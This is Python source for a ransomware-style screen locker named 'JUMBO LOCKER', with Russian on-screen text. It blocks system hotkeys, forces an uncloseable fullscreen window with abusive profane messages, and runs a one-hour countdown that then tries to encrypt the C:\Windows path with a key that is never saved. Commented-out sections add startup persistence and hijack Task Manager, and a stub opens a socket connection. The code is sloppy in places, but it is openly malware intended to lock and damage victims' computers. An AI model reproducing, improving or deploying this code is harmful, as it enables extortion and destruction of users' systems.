import tkinter as tk
from tkinter import messagebox
import time
import threading
import os
import pygame
import sys
import shutil
from cryptography.fernet import Fernet
import subprocess
import pygame
import keyboard
from tkinter import *
from PIL import Image, ImageTk
import socket

import socket
from requests import get

def start_client():
    server_ip = get('https://api64.ipify.org?format=json').json()['ip']
    server_port = 12345  # Порт сервера
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((server_ip, server_port))
    print("Connected to server")


keyboard.add_hotkey("alt + tab", lambda: None, suppress =True)
keyboard.add_hotkey("win + r", lambda: None, suppress =True)
keyboard.add_hotkey("win + e", lambda: None, suppress =True)
keyboard.add_hotkey("ctrl + shift + esc", lambda: None, suppress =True)

#startup_filename = "JUMBO LOCKER"
#startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
#current_script = sys.argv[0]
#startup_script = os.path.join(startup_folder, startup_filename + ".exe")
#if not os.path.exists(startup_script):
#   shutil.copy2(current_script, startup_script)

image_path = "background.png"
def set_background(window, image_path):
    screen_width = window.winfo_screenwidth()
    screen_height = window.winfo_screenheight()
    img = Image.open(image_path)
    img = img.resize((screen_width, screen_height))
    window.background_image = ImageTk.PhotoImage(img)
    background_label = Label(window, image=window.background_image)
    background_label.place(x=0, y=0, relwidth=1, relheight=1)
    background_label.lower()


def decrypt_file(file_path, key):
    with open(file_path, "rb") as file:
        encrypted_data = file.read()
    fernet = Fernet(key)
    decrypted_data = fernet.decrypt(encrypted_data)
    with open(file_path, "wb") as file:
        file.write(decrypted_data)

def check():
    global is_code_entered
    if entry.get() == unlock_key:
        is_code_entered = True
        messagebox.showinfo("Уведомление", "Ключ введен верно. Хорошего дня!")
        win.attributes("-fullscreen", False)
        win.update()
        win.geometry("300x300")
        decrypt_file(file_to_encrypt, fernet_key)
        sys.exit() 
    else:
        messagebox.showinfo("Уведомление", "ДА ПИЗДА УЖЕ КОМПУ МОЖЕШЬ НЕ ПЫТАТЬСЯ")

def on_closing():
    global is_code_entered
    if not is_code_entered:
        messagebox.showinfo("Уведомление", "НЕ ПЫТАЙСЯ, Я ВСЕРАВНО ВЫЕБУ ТВОЮ ЖЕПУ")
    else:
        win.quit()

def encrypt_file(file_path, key):
    with open(file_path, "rb") as file:
        data = file.read()
    fernet = Fernet(key)
    encrypted_data = fernet.encrypt(data)
    with open(file_path, "wb") as file:
        file.write(encrypted_data)

def countdown_thread(seconds, file_to_encrypt):
    while seconds > 0 and not is_code_entered:
        time_label.config(text=f"Осталось времени: {seconds} сек.")
        win.update()
        time.sleep(1)
        seconds -= 1
    if not is_code_entered:
        time_label.config(text="Время истекло!")
        encrypt_file(file_to_encrypt, fernet_key)  

audio_path = 'angry-birds-bass-boosted.mp3'
file_to_encrypt = "C:\Windows"  

unlock_key = '123123'
is_code_entered = False

win = tk.Tk()
win.title('JUMBO LOCKER')
set_background(win, image_path)
win.resizable(False, False)
logo = tk.PhotoImage(file='logo.png')
win.iconphoto(False, logo)

win.protocol("WM_DELETE_WINDOW", on_closing)

win.attributes("-fullscreen", True)
win.config(bg='black')

label = tk.Label(win, text='ТВОЙ ПК ЗАБЛОКИРОВАН BY JUMBO LOCKER. ПОПЛАЧЬ УЕБОК ВЕДЬ У ТЕБЯ НЕТ КЛЮЧА))', fg='red', bg='black')
label.grid(row=2, padx=350, pady=20)
label.config(font=("Helvetica", 17))

entry = tk.Entry(win, show='*')
entry.grid(row=4, padx=350, pady=20)

button = tk.Button(win, text="Ввести код", command=check)
button.grid(row=5, padx=350, pady=20)

seconds_to_countdown = 3600
time_label = tk.Label(win, text="", fg='red', bg='black')
time_label.grid(row=0, padx=350, pady=20)

fernet_key = Fernet.generate_key()


pygame.init()
pygame.mixer.init()
pygame.mixer.music.load(audio_path)
pygame.mixer.music.play(-1)

countdown_thread = threading.Thread(target=countdown_thread, args=(seconds_to_countdown, file_to_encrypt))
countdown_thread.start()
 
#path1 = "C:\Windows\System32\Taskmgr.exe"
#path2 = "C:\Windows\System32\Taskmgr1.exe"
#os.system("takeown /f C:\Windows\System32\Taskmgr.exe")  
#os.system("icacls C:\Windows\System32\Taskmgr.exe /grant Администраторы:F /c /l") 
#os.system("icacls C:\Windows\System32\Taskmgr.exe /grant Пользователи:F /c /l") 
#os.system("taskkill /im taskmgr.exe") 
#os.rename(path1, path2)



win.mainloop()
